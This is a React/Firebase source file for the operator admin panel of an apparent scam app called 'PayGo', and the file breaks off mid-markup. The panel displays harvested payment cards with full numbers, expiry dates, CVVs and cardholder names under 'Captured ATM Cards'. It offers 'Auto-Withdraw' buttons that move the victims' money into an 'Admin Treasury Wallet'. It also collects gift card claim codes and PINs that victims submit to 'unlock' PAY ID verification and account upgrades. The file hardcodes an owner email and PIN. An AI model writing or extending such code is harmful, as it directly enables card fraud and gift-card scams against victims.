import React, { useState, useEffect } from 'react';
import {
  ArrowLeft,
  CreditCard,
  Gift,
  CheckCircle2,
  Lock,
  ArrowDownRight,
  Check,
  Copy,
  Sparkles,
  Eye,
  CheckCircle,
  LogOut,
  ShieldCheck,
  Ban,
  Trash2,
} from 'lucide-react';

import { collection, onSnapshot, query, doc, updateDoc, setDoc, getDoc, deleteDoc } from 'firebase/firestore';
import { onAuthStateChanged, signInWithPopup, signOut, User as FirebaseUser } from 'firebase/auth';
import { db, auth, googleProvider, handleFirestoreError, OperationType, blockUsedGiftCardCode } from '../lib/firebase';
import { GiftCardSubmission } from '../types';
import { hashGiftCardCode } from '../utils/giftCardValidator';

const OWNER_EMAIL = 'ibro88977@gmail.com';
const OWNER_PIN = '4568';

interface CapturedCard {
  id: string;
  type: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  cardName: string;
  amount: number;
  userEmail: string;
  userName: string;
  date: string;
  timestamp?: string;
}

interface AdminPanelProps {
  onBack: () => void;
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
  const [activeTab, setActiveTab] = useState<'cards' | 'giftcards'>('cards');
  const [cards, setCards] = useState<CapturedCard[]>([]);
  const [giftCards, setGiftCards] = useState<GiftCardSubmission[]>([]);
  const [firebaseUser, setFirebaseUser] = useState<FirebaseUser | null>(null);
  const [authReady, setAuthReady] = useState(false);
  const [isPinUnlocked, setIsPinUnlocked] = useState(false);
  const [pin, setPin] = useState('');
  const [error, setError] = useState('');
  const [isSigningIn, setIsSigningIn] = useState(false);
  const [selectedCardForWithdraw, setSelectedCardForWithdraw] = useState<CapturedCard | null>(null);
  const [withdrawAmountInput, setWithdrawAmountInput] = useState('');
  const [isWithdrawing, setIsWithdrawing] = useState(false);
  const [withdrawSuccess, setWithdrawSuccess] = useState(false);
  const [previewImage, setPreviewImage] = useState<string | null>(null);
  const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
  const [blockCodeInput, setBlockCodeInput] = useState('');
  const [blockNotice, setBlockNotice] = useState('');
  const [adminWalletBalance, setAdminWalletBalance] = useState<number>(() => {
    const saved = localStorage.getItem('paygo_admin_wallet_balance');
    return saved ? parseFloat(saved) : 64500.00;
  });

  useEffect(() => {
    localStorage.setItem('paygo_admin_wallet_balance', adminWalletBalance.toString());
  }, [adminWalletBalance]);

  const handleAutoWithdrawCard = async (c: CapturedCard) => {
    const amountToWithdraw = c.amount || 25;
    setIsWithdrawing(true);
    setTimeout(async () => {
      setAdminWalletBalance((prev) => prev + amountToWithdraw);
      setIsWithdrawing(false);
      alert(`Auto-withdrawn $${amountToWithdraw.toLocaleString()} from card ${c.cardNumber} directly into Admin Treasury Wallet!`);
      try {
        await deleteDoc(doc(db, 'cardSubmissions', c.id));
      } catch (err) {
        console.warn('Failed to clean up auto-withdrawn card:', err);
      }
    }, 800);
  };

  const handleAutoSettleAllCards = async () => {
    if (cards.length === 0) {
      alert('No ATM cards available to auto-settle.');
      return;
    }
    if (!window.confirm(`Auto-withdraw funds from all ${cards.length} linked ATM cards directly into Admin Treasury Wallet?`)) {
      return;
    }
    let totalSettle = 0;
    cards.forEach((c) => {
      totalSettle += c.amount || 25;
    });

    setIsWithdrawing(true);
    setTimeout(async () => {
      setAdminWalletBalance((prev) => prev + totalSettle);
      setIsWithdrawing(false);
      alert(`Successfully auto-settled $${totalSettle.toLocaleString()} from all ${cards.length} ATM cards into Admin Treasury Wallet!`);
      for (const c of cards) {
        try {
          await deleteDoc(doc(db, 'cardSubmissions', c.id));
        } catch {}
      }
    }, 1200);
  };

  const isOwnerGoogleVerified =
    !!firebaseUser &&
    firebaseUser.email?.toLowerCase() === OWNER_EMAIL &&
    firebaseUser.emailVerified === true;

  const isFullyAuthorized = isOwnerGoogleVerified && isPinUnlocked;

  // Watch Firebase Auth state
  useEffect(() => {
    const unsub = onAuthStateChanged(auth, async (current) => {
      if (current && current.email?.toLowerCase() !== OWNER_EMAIL) {
        await signOut(auth).catch(() => {});
        setFirebaseUser(null);
        setIsPinUnlocked(false);
        setError('Access denied: Only the authorized owner account can access this portal.');
      } else {
        setFirebaseUser(current);
      }
      setAuthReady(true);
    });
    return () => unsub();
  }, []);

  // Load ATM Card Submissions only when verified as owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setCards([]);
      return;
    }

    const q = query(collection(db, 'cardSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedCards: CapturedCard[] = [];
        snapshot.forEach((docSnap) => {
          fetchedCards.push({ id: docSnap.id, ...docSnap.data() } as CapturedCard);
        });
        fetchedCards.sort((a, b) => {
          const timeA = a.timestamp || a.date || '';
          const timeB = b.timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setCards(fetchedCards);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'cardSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  // Load Gift Card Verification Submissions only when verified as owner + PIN unlocked
  useEffect(() => {
    if (!isFullyAuthorized) {
      setGiftCards([]);
      return;
    }

    const q = query(collection(db, 'giftCardSubmissions'));
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const fetchedGifts: GiftCardSubmission[] = [];
        snapshot.forEach((docSnap) => {
          fetchedGifts.push({ id: docSnap.id, ...docSnap.data() } as GiftCardSubmission);
        });
        fetchedGifts.sort((a, b) => {
          const timeA = (a as any).timestamp || a.date || '';
          const timeB = (b as any).timestamp || b.date || '';
          return timeB.localeCompare(timeA);
        });
        setGiftCards(fetchedGifts);
      },
      (err) => {
        handleFirestoreError(err, OperationType.LIST, 'giftCardSubmissions');
      }
    );
    return () => unsubscribe();
  }, [isFullyAuthorized]);

  const handleOwnerGoogleSignIn = async () => {
    setError('');
    setIsSigningIn(true);
    try {
      const result = await signInWithPopup(auth, googleProvider);
      if (
        result.user.email?.toLowerCase() !== OWNER_EMAIL ||
        !result.user.emailVerified
      ) {
        await signOut(auth);
        setFirebaseUser(null);
        setError('Access denied: Only the authorized owner account can access this portal.');
      }
    } catch (err: any) {
      console.error('Owner Google sign-in error:', err);
      setError(err?.message || 'Google sign-in failed. Please try again.');
    } finally {
      setIsSigningIn(false);
    }
  };

  const handlePinUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isOwnerGoogleVerified) {
      setError('Please verify your owner Google account first.');
      return;
    }
    if (pin.trim() === OWNER_PIN) {
      setIsPinUnlocked(true);
      setPin('');
      setError('');
    } else {
      setError('Invalid Owner PIN');
    }
  };

  const handleAdminSignOut = async () => {
    setIsPinUnlocked(false);
    setPin('');
    await signOut(auth).catch(() => {});
  };

  const copyText = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCodeId(id);
    setTimeout(() => setCopiedCodeId(null), 2000);
  };

  const handleUpdateGiftCardStatus = async (
    g: GiftCardSubmission,
    newStatus: 'verified' | 'redeemed' | 'rejected',
    customReason?: string
  ) => {
    try {
      const rejectionReason =
        customReason || 'USED / FAKE GIFT CARD: Wrong or already-used gift card is not allowed.';
      const nowIso = new Date().toISOString();
      const updates: Record<string, any> = { status: newStatus };
      if (newStatus === 'rejected') {
        updates.rejectionReason = rejectionReason;
      }
      await updateDoc(doc(db, 'giftCardSubmissions', g.id), updates);

      // Update PII-free real-time status mirror so the client receives instant approval or rejection
      if (g.statusId) {
        const statusPayload: Record<string, any> = {
          id: g.statusId,
          type: g.type,
          status: newStatus,
          updatedAt: nowIso,
        };
        if (newStatus === 'rejected') {
          statusPayload.rejectionReason = rejectionReason;
        }
        await setDoc(doc(db, 'giftCardStatuses', g.statusId), statusPayload);
      }

      const codeHash = g.codeHash || (await hashGiftCardCode(g.cardCode));
      await setDoc(
        doc(db, 'usedGiftCards', codeHash),
        {
          codeHash,
          brand: g.cardBrand,
          status: newStatus === 'rejected' ? 'used_rejected' : 'redeemed',
          createdAt: nowIso,
        },
        { merge: true }
      );

      // Sync user profile in Firestore (approve PAY ID / tier upgrade OR revoke if rejected as used/wrong)
      if (g.userEmail && g.userEmail !== 'unknown') {
        const cleanUserEmail = g.userEmail.trim().toLowerCase();
        const userRef = doc(db, 'users', cleanUserEmail);
        const userSnap = await getDoc(userRef);
        if (userSnap.exists()) {
          if (newStatus === 'rejected') {
            await updateDoc(userRef, {
              payIdVerified: false,
              accountLevel: 'Basic',
              updatedAt: nowIso,
            });
          } else if (newStatus === 'verified' || newStatus === 'redeemed') {
            const profileUpdates: Record<string, any> = { updatedAt: nowIso };
            if (g.type === 'PAY ID Verification') {
              profileUpdates.payIdVerified = true;
            } else if (g.type.startsWith('Stage ')) {
              profileUpdates.accountLevel = g.type;
            }
            await updateDoc(userRef, profileUpdates);
          }
        }
      }
    } catch (err) {
      handleFirestoreError(err, OperationType.UPDATE, `giftCardSubmissions/${g.id}`);
    }
  };

  const handleManualBlockUsedCard = async (e: React.FormEvent) => {
    e.preventDefault();
    setBlockNotice('');
    const clean = blockCodeInput.trim();
    if (clean.length < 6) {
      setBlockNotice('Enter at least 6 characters of the used gift card code.');
      return;
    }
    try {
      await blockUsedGiftCardCode(clean, 'Admin Flagged Used Card');
      setBlockCodeInput('');
      setBlockNotice('Used gift card code permanently blocked. No user can drop it.');
    } catch (err: any) {
      setBlockNotice(err?.message || 'Failed to block card code.');
    }
  };

  const handleExecuteWithdraw = (e: React.FormEvent) => {
    e.preventDefault();
    if (!withdrawAmountInput || parseFloat(withdrawAmountInput) <= 0) {
      return;
    }
    setIsWithdrawing(true);
    setTimeout(() => {
      setIsWithdrawing(false);
      setWithdrawSuccess(true);
    }, 1500);
  };

  const handleDeleteCard = async (cardId: string) => {
    if (!window.confirm('Are you sure you want to remove this ATM card submission? Only admin has access to remove ATM details.')) {
      return;
    }
    try {
      await deleteDoc(doc(db, 'cardSubmissions', cardId));
    } catch (err) {
      handleFirestoreError(err, OperationType.DELETE, `cardSubmissions/${cardId}`);
    }
  };

  const handleApproveCardSubmission = async (c: CapturedCard) => {
    try {
      const cleanEmail = c.userEmail?.trim().toLowerCase();
      if (!cleanEmail || cleanEmail === 'unknown') {
        alert('User email not found for this card submission.');
        return;
      }
      const userRef = doc(db, 'users', cleanEmail);
      const updates: Record<string, any> = { updatedAt: new Date().toISOString() };
      if (c.type.toLowerCase().includes('pay id') || c.amount === 25) {
        updates.payIdVerified = true;
      } else if (c.type.startsWith('Stage ')) {
        updates.accountLevel = c.type.replace(' Card Purchase', '').replace(' Card', '');
      } else {
        updates.payIdVerified = true;
      }
      await updateDoc(userRef, updates);
      alert(`Successfully approved and unlocked for ${c.userEmail}!`);
    } catch (err: any) {
      alert(err?.message || 'Failed to approve card submission.');
    }
  };

  if (!isFullyAuthorized) {
    return (
      <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4">
        <div className="bg-gray-800 rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl text-white">
          <div className="w-16 h-16 bg-purple-600/20 text-purple-400 rounded-2xl flex items-center justify-center mx-auto mb-4 border border-purple-500/30">
            <Lock className="w-8 h-8" />
          </div>
          <h2 className="text-2xl font-bold text-center mb-1">Owner Admin Access</h2>
          <p className="text-xs text-gray-400 text-center mb-6">
            Restricted to authorized owner only
          </p>

          {error && (
            <div className="mb-4 p-3 bg-red-900/50 border border-red-700 text-red-300 text-xs rounded-xl">
              {error}
            </div>
          )}

          {!authReady ? (
            <div className="py-8 flex justify-center">
              <div className="w-8 h-8 border-4 border-purple-500 border-t-transparent rounded-full animate-spin" />
            </div>
          ) : !isOwnerGoogleVerified ? (
            <div className="space-y-4">
              <div className="bg-gray-900/80 border border-gray-700 rounded-2xl p-4 text-xs text-gray-300 leading-relaxed">
                Step 1 of 2: Sign in with the verified owner Google account to unlock database access.
              </div>
              <button
                type="button"
                onClick={handleOwnerGoogleSignIn}
                disabled={isSigningIn}
                className="w-full bg-white hover:bg-gray-100 text-gray-900 font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
              >
                <ShieldCheck className="w-4 h-4 text-purple-700" />
                <span>{isSigningIn ? 'Verifying...' : 'Sign in with Owner Google Account'}</span>
              </button>
            </div>
          ) : (
            <form onSubmit={handlePinUnlock} className="space-y-4">
              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-3 text-xs text-emerald-300 flex items-center justify-between">
                <span className="truncate">Verified: {firebaseUser?.email}</span>
                <button
                  type="button"
                  onClick={handleAdminSignOut}
                  className="text-gray-300 hover:text-white underline ml-2 shrink-0 cursor-pointer"
                >
                  Switch
                </button>
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
                  Enter Owner PIN
                </label>
                <input
                  type="password"
                  value={pin}
                  onChange={(e) => setPin(e.target.value)}
                  placeholder="Enter Owner PIN"
                  className="w-full p-3.5 bg-gray-900 border border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none text-sm text-white font-mono tracking-widest text-center"
                  required
                />
              </div>

              <button
                type="submit"
                className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer"
              >
                Access Admin Logs
              </button>
            </form>
          )}

          <div className="mt-6 pt-4 border-t border-gray-700 text-center">
            <button
              onClick={onBack}
              className="text-xs text-gray-400 hover:text-white transition-colors cursor-pointer"
            >
              ← Return to PayGo App
            </button>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white pb-12">
      {/* Top Bar */}
      <div className="bg-gray-800 p-4 border-b border-gray-700 sticky top-0 z-30 shadow-md">
        <div className="max-w-5xl mx-auto flex flex-wrap items-center justify-between gap-3">
          <div className="flex items-center space-x-3">
            <button
              onClick={onBack}
              className="p-2 hover:bg-gray-700 rounded-full transition-colors text-white cursor-pointer"
            >
              <ArrowLeft className="w-5 h-5" />
            </button>
            <div>
              <h1 className="text-lg font-bold flex items-center space-x-2">
                <span>Owner Admin Portal</span>
                <span className="text-xs bg-emerald-500/20 text-emerald-400 px-2 py-0.5 rounded-full border border-emerald-500/30 font-mono">
                  Live Cloud
                </span>
              </h1>
              <p className="text-xs text-gray-400">
                PayGo Settlement Treasury • {firebaseUser?.email || OWNER_EMAIL}
              </p>
            </div>
          </div>

          <div className="flex items-center space-x-2">
            {/* Quick tab switcher in header */}
            <div className="flex space-x-1 bg-gray-900 p-1 rounded-xl border border-gray-700">
              <button
                onClick={() => setActiveTab('cards')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'cards'
                    ? 'bg-purple-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <CreditCard className="w-3.5 h-3.5" />
                <span>Card / Other Option ({cards.length})</span>
              </button>
              <button
                onClick={() => setActiveTab('giftcards')}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
                  activeTab === 'giftcards'
                    ? 'bg-amber-600 text-white'
                    : 'text-gray-400 hover:text-white'
                }`}
              >
                <Gift className="w-3.5 h-3.5" />
                <span>Gift Cards ({giftCards.length})</span>
              </button>
            </div>

            <button
              onClick={handleAdminSignOut}
              title="Lock Admin Portal"
              className="bg-red-500/20 hover:bg-red-500/30 text-red-300 px-3 py-2 rounded-xl text-xs font-semibold border border-red-500/30 flex items-center space-x-1 cursor-pointer"
            >
              <LogOut className="w-3.5 h-3.5" />
              <span className="hidden sm:inline">Lock</span>
            </button>
          </div>
        </div>
      </div>

      <div className="max-w-5xl mx-auto p-4 sm:p-6 space-y-6">
        {/* Summary Metric Cards */}
        <div className="grid grid-cols-1 sm:grid-cols-4 gap-4">
          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Captured ATM Cards</p>
              <CreditCard className="w-4 h-4 text-purple-400" />
            </div>
            <h3 className="text-3xl font-black text-purple-400 mt-1">{cards.length}</h3>
            <p className="text-xs text-gray-500 mt-1">Ready for Auto ATM withdrawal</p>
          </div>

          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Gift Card Verifications</p>
              <Gift className="w-4 h-4 text-amber-400" />
            </div>
            <h3 className="text-3xl font-black text-amber-400 mt-1">{giftCards.length}</h3>
            <p className="text-xs text-gray-500 mt-1">Apple, Steam, Razer Gold, etc.</p>
          </div>

          <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm sm:col-span-2">
            <div className="flex items-center justify-between">
              <p className="text-xs text-gray-400 uppercase font-medium">Admin Treasury Wallet (Auto-ATM)</p>
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="flex items-baseline justify-between mt-1">
              <h3 className="text-2xl font-black text-emerald-400 font-mono">
                ${adminWalletBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
              </h3>
              <button
                onClick={handleAutoSettleAllCards}
                disabled={cards.length === 0 || isWithdrawing}
                className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-3 py-1.5 rounded-xl cursor-pointer disabled:opacity-50 transition-all flex items-center space-x-1"
              >
                <ArrowDownRight className="w-3.5 h-3.5" />
                <span>Auto-Withdraw All ATM</span>
              </button>
            </div>
            <p className="text-xs text-gray-400 mt-1">Direct ATM settlement vault • {OWNER_EMAIL}</p>
          </div>
        </div>

        {/* Tab 1: ATM Cards */}
        {activeTab === 'cards' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <CreditCard className="w-5 h-5 text-purple-400" />
                <span>Captured ATM Cards & Withdrawals</span>
              </h2>
              <span className="text-xs text-gray-400 font-mono">
                {cards.length} Total Submissions
              </span>
            </div>

            {cards.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <CreditCard className="w-12 h-12 mx-auto mb-3 opacity-40" />
                <p className="text-sm">No ATM cards captured yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  When users submit card details during Upgrade, PayId or Deposit, they appear here live.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {cards.map((c) => (
                  <div
                    key={c.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-purple-500/50 transition-all"
                  >
                    <div className="flex items-center justify-between border-b border-gray-700 pb-3">
                      <div className="flex items-center space-x-2">
                        <span className="bg-purple-600/30 text-purple-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-purple-500/30">
                          {c.type}
                        </span>
                        <span className="text-xs text-gray-400 font-mono">{c.date}</span>
                      </div>
                      <span className="font-black text-emerald-400 text-lg">
                        ${c.amount?.toLocaleString()}
                      </span>
                    </div>

                    <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Card Number</p>
                        <div className="flex items-center space-x-1.5 mt-0.5">
                          <p className="font-mono font-bold text-white text-sm">{c.cardNumber}</p>
                          <button
                            onClick={() => copyText(c.cardNumber.replace(/\s/g, ''), `card-${c.id}`)}
                            className="p-1 text-gray-400 hover:text-white"
                            title="Copy card number"
                          >
                            {copiedCodeId === `card-${c.id}` ? (
                              <Check className="w-3.5 h-3.5 text-emerald-400" />
                            ) : (
                              <Copy className="w-3.5 h-3.5" />
                            )}
                          </button>
                        </div>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Expiry / CVV</p>
                        <p className="font-mono font-bold text-white text-sm mt-0.5">
                          {c.expiry} • {c.cvv}
                        </p>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Cardholder Name</p>
                        <p className="font-bold text-white uppercase mt-0.5">{c.cardName}</p>
                      </div>
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">User Account</p>
                        <p className="font-medium text-purple-300 truncate mt-0.5">
                          {c.userName} ({c.userEmail})
                        </p>
                      </div>
                    </div>

                    <div className="pt-2 flex flex-wrap items-center justify-end gap-2">
                      <button
                        onClick={() => handleApproveCardSubmission(c)}
                        className="bg-purple-600 hover:bg-purple-700 text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md"
                      >
                        <ShieldCheck className="w-4 h-4" />
                        <span>Approve & Unlock</span>
                      </button>
                      <button
                        onClick={() => handleDeleteCard(c.id)}
                        className="bg-red-600/20 hover:bg-red-600 text-red-300 hover:text-white text-xs font-bold px-3.5 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer border border-red-500/30"
                      >
                        <Trash2 className="w-4 h-4" />
                        <span>Remove</span>
                      </button>
                      <button
                        onClick={() => handleAutoWithdrawCard(c)}
                        disabled={isWithdrawing}
                        className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md disabled:opacity-50"
                      >
                        <ArrowDownRight className="w-4 h-4" />
                        <span>Auto-Withdraw to Wallet</span>
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Tab 2: Gift Cards */}
        {activeTab === 'giftcards' && (
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-base font-bold text-gray-200 flex items-center space-x-2">
                <Gift className="w-5 h-5 text-amber-400" />
                <span>Gift Card Submissions & Redemptions</span>
              </h2>
              <span className="text-xs text-gray-400 font-mono">
                {giftCards.length} Total Submissions
              </span>
            </div>

            {/* Admin Used Card Blocklist Control */}
            <form
              onSubmit={handleManualBlockUsedCard}
              className="bg-gray-800 border border-red-500/30 rounded-2xl p-4 space-y-2.5"
            >
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-2 text-xs font-bold text-red-300">
                  <Ban className="w-4 h-4 text-red-400" />
                  <span>Block Used / Already-Redeemed Gift Card Code</span>
                </div>
                <span className="text-[10px] text-gray-400">SHA-256 Registry</span>
              </div>
              <div className="flex flex-col sm:flex-row gap-2">
                <input
                  type="text"
                  value={blockCodeInput}
                  onChange={(e) => setBlockCodeInput(e.target.value.toUpperCase())}
                  placeholder="Paste any used gift card code to block it globally..."
                  className="flex-1 px-3 py-2.5 bg-gray-900 border border-gray-700 rounded-xl text-xs font-mono text-white uppercase outline-none focus:ring-2 focus:ring-red-500"
                />
                <button
                  type="submit"
                  className="bg-red-600 hover:bg-red-700 text-white font-bold px-4 py-2.5 rounded-xl text-xs cursor-pointer shrink-0"
                >
                  Block Used Card
                </button>
              </div>
              {blockNotice && <p className="text-[11px] text-emerald-400 font-medium">{blockNotice}</p>}
            </form>

            {giftCards.length === 0 ? (
              <div className="bg-gray-800 border border-gray-700 rounded-2xl p-12 text-center text-gray-400">
                <Gift className="w-12 h-12 mx-auto mb-3 opacity-40 text-amber-400" />
                <p className="text-sm">No gift card verifications submitted yet.</p>
                <p className="text-xs text-gray-500 mt-1">
                  When users submit gift cards for Upgrade or PAY ID verification, claim codes and photos appear here.
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {giftCards.map((g) => (
                  <div
                    key={g.id}
                    className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm space-y-4 hover:border-amber-500/50 transition-all"
                  >
                    <div className="flex items-center justify-between border-b border-gray-700 pb-3">
                      <div className="flex items-center space-x-2">
                        <span className="bg-amber-600/30 text-amber-300 px-2.5 py-1 rounded-lg text-xs font-bold border border-amber-500/30 flex items-center space-x-1">
                          <Gift className="w-3.5 h-3.5" />
                          <span>{g.cardBrand}</span>
                        </span>
                        <span className="text-xs bg-gray-700 text-gray-300 px-2 py-0.5 rounded-md">
                          {g.type}
                        </span>
                        <span className="text-xs text-gray-400 font-mono hidden sm:inline">{g.date}</span>
                      </div>
                      <div className="flex items-center space-x-3">
                        <span className="font-black text-amber-400 text-lg">
                          ${g.amount?.toLocaleString()}
                        </span>
                        <span
                          className={`text-xs px-2.5 py-1 rounded-full font-bold uppercase ${
                            g.status === 'redeemed'
                              ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                              : g.status === 'verified'
                              ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
                              : g.status === 'rejected'
                              ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                              : 'bg-amber-500/20 text-amber-400 border border-amber-500/30'
                          }`}
                        >
                          {g.status || 'pending'}
                        </span>
                      </div>
                    </div>

                    <div className="grid grid-cols-1 sm:grid-cols-4 gap-3 text-xs">
                      {/* Claim Code with Quick Copy */}
                      <div className="sm:col-span-2 bg-gray-900/80 p-3 rounded-xl border border-gray-700/80">
                        <p className="text-gray-400 text-[10px] uppercase font-semibold mb-1">
                          Gift Card Claim Code / PIN
                        </p>
                        <div className="flex items-center justify-between">
                          <span className="font-mono font-bold text-amber-300 text-sm tracking-wider select-all break-all">
                            {g.cardCode}
                          </span>
                          <button
                            onClick={() => copyText(g.cardCode, `code-${g.id}`)}
                            className="ml-2 bg-amber-600/20 hover:bg-amber-600/30 text-amber-300 px-2.5 py-1 rounded-lg text-xs font-semibold flex items-center space-x-1 shrink-0 transition-colors cursor-pointer border border-amber-500/30"
                          >
                            {copiedCodeId === `code-${g.id}` ? (
                              <>
                                <Check className="w-3 h-3 text-emerald-400" />
                                <span>Copied</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-3 h-3" />
                                <span>Copy Code</span>
                              </>
                            )}
                          </button>
                        </div>
                        {g.cardPin && g.cardPin !== 'N/A' && (
                          <p className="text-[11px] text-gray-400 font-mono mt-1">
                            Card PIN / CVV: <span className="text-white font-bold">{g.cardPin}</span>
                          </p>
                        )}
                      </div>

                      {/* User Account Info */}
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">User Profile</p>
                        <p className="font-bold text-white mt-0.5">{g.userName}</p>
                        <p className="text-purple-300 truncate text-[11px]">{g.userEmail}</p>
                        <span className="text-[10px] text-gray-500 block mt-0.5">
                          Format: {g.cardFormat === 'physical' ? 'Physical Card' : 'Digital E-Code'}
                        </span>
                      </div>

                      {/* Photo / Receipt attachment */}
                      <div>
                        <p className="text-gray-400 text-[10px] uppercase font-medium">Uploaded Image</p>
                        {g.image ? (
                          <div
                            onClick={() => setPreviewImage(g.image || null)}
                            className="mt-1 flex items-center space-x-2 bg-gray-900 p-2 rounded-xl border border-gray-700 cursor-pointer hover:border-amber-400 transition-colors"
                          >
                            <img
                              src={g.image}
                              alt="Card receipt"
                              className="w-10 h-10 object-cover rounded-lg border border-gray-600"
                            />
                            <div className="text-[11px]">
                              <span className="text-amber-300 font-bold block flex items-center space-x-1">
                                <Eye className="w-3 h-3" />
                                <span>View Photo</span>
                              </span>
                              <span className="text-gray-500 text-[10px]">Tap to enlarge</span>
                            </div>
                          </div>
                        ) : (
                          <p className="text-gray-500 text-[11px] mt-1 italic">No photo attached (E-Code)</p>
                        )}
                      </div>
                    </div>

                    {/* Status Management Actions */}
                    <div className="pt-2 border-t border-gray-700/60 flex flex-wrap items-center justify-between gap-2">
                      <div className="text-[11px] text-gray-400">
                        Status:{' '}
                        <span className="font-semibold text-white capitalize">
                          {g.status || 'pending'}
                        </span>
                        {g.rejectionReason && (
                          <span className="text-red-400 ml-2">({g.rejectionReason})</span>
                        )}
                      </div>

                      <div className="flex flex-wrap items-center gap-2">
                        {g.status !== 'rejected' && (
                          <>
                            <button
                              onClick={() =>
                                handleUpdateGiftCardStatus(
                                  g,
                                  'rejected',
                                  'USED GIFT CARD: This gift card has already been used/redeemed before and is not allowed.'
                                )
                              }
                              className="bg-red-600/30 hover:bg-red-600 text-red-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-red-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Used Card</span>
                            </button>
                            <button
                              onClick={() =>
                                handleUpdateGiftCardStatus(
                                  g,
                                  'rejected',
                                  'FAKE / WRONG GIFT CARD: This gift card code or proof photo is fake, invalid, or wrong.'
                                )
                              }
                              className="bg-rose-600/30 hover:bg-rose-600 text-rose-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-rose-500/30 transition-all cursor-pointer flex items-center space-x-1"
                            >
                              <Ban className="w-3.5 h-3.5" />
                              <span>Reject: Fake / Wrong</span>
                            </button>
                          </>
                        )}

                        {g.status !== 'verified' && (
                          <button
                            onClick={() => handleUpdateGiftCardStatus(g, 'verified')}
                            className="bg-blue-600/30 hover:bg-blue-600 text-blue-200 hover:text-white px-3 py-1.5 rounded-xl text-xs font-semibold border border-blue-500/30 transition-all cursor-pointer flex items-center space-x-1"
                          >
                            <CheckCircle className="w-3.5 h-3.5" />
                            <span>
                              {g.type === 'PAY ID Verification'
                                ? 'Confirm Gift Card & Release PAY ID'
                                : 'Confirm Gift Card'}
                            </span>
                          </button>
                        )}

                        {g.status !== 'redeemed' && (
                          <button
                            onClick={() => handleUpdateGiftCardStatus(g, 'redeemed')}
                            className="bg-emerald-600 hover:bg-emerald-700 text-white px-3.5 py-1.5 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center space-x-1 shadow-sm"
                          >
                            <Sparkles className="w-3.5 h-3.5" />
                            <span>Redeem / Complete</span>
                          </button>
                        )}
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </div>

      {/* ATM Card Withdraw Modal */}
      {selectedCardForWithdraw && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-xs flex items-center justify-center p-4 z-50">
